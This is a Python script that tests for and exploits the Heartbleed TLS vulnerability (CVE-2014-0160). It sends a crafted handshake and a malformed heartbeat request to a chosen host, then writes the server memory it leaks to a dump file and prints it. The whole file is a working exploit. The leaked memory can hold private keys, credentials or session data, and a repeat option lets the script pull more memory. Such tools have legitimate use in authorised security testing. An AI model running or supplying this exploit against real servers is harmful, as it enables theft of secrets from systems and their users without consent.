#!/usr/bin/python

import sys
import struct
import socket
import time
import select
from optparse import OptionParser

# Define options for the script using OptionParser
options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory to (default: dump.bin)')
options.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')

# Helper function to convert hex to binary
def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))

# Define the client hello packet (sent to initiate the handshake)
hello = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39
00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d
c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04
00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e
00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15
00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01
''')

# Define the heartbeat requests
hb_requests = [
    h2bin('18 03 01 00 03 01 40 00'),
    h2bin('18 03 02 00 03 01 40 00'),
    h2bin('18 03 03 00 03 01 40 00')
]

def hexdump(data, dumpf, quiet):
    with open(dumpf, 'ab') as dump_file:
        dump_file.write(data)
    if quiet:
        return
    for b in range(0, len(data), 16):
        line = data[b:b+16]
        hxdat = ' '.join('%02X' % c for c in line)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.') for c in line)
        print(f'  {b:04x}: {hxdat:<48} {pdat}')
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    data = b''
    while len(data) < length:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, _, _ = select.select([s], [], [], rtime)
        if s in r:
            chunk = s.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
    return data

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(f' ... received message: type = {typ}, ver = {ver:04x}, length = {len(pay)}')
    return typ, ver, pay

def hit_hb(s, dumpf, host, quiet):
    s.send(hb_requests[1])  # Sending the heartbeat request for TLS 1.1
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print(f'No heartbeat response received from {host}, server likely not vulnerable')
            return False
        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay, dumpf, quiet)
            if len(pay) > 3:
                print(f'WARNING: server {host} returned more data than it should - server is vulnerable!')
            else:
                print(f'Server {host} processed malformed heartbeat, but did not return any extra data.')
            return True
        if typ == 21:
            print('Received alert:')
            hexdump(pay, dumpf, quiet)
            print(f'Server {host} returned error, likely not vulnerable')
            return False

def connect(host, port, quiet):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if not quiet:
        print('Connecting...')
    s.connect((host, port))
    return s

def tls_handshake(s, quiet):
    if not quiet:
        print('Sending Client Hello...')
    s.send(hello)
    if not quiet:
        print('Waiting for Server Hello...')
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print('Server closed connection without sending Server Hello.')
            return 0
        if typ == 22 and pay[0] == 0x0E:
            return ver

def check_heartbleed(host, port, dumpf, quiet):
    s = connect(host, port, quiet)
    tls_version = tls_handshake(s, quiet) - 0x0300
    if not tls_version:
        if not quiet:
            print("Got an error while parsing the response, bailing ...")
        return False
    if not quiet:
        print(f"Server TLS version was 1.{tls_version}\n")
    return hit_hb(s, dumpf, host, quiet)

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    host = args[0]
    print(f'Scanning {host} on port {opts.port}')
    for _ in range(opts.num):
        check_heartbleed(host, opts.port, opts.file, opts.quiet)

if __name__ == '__main__':
    main()
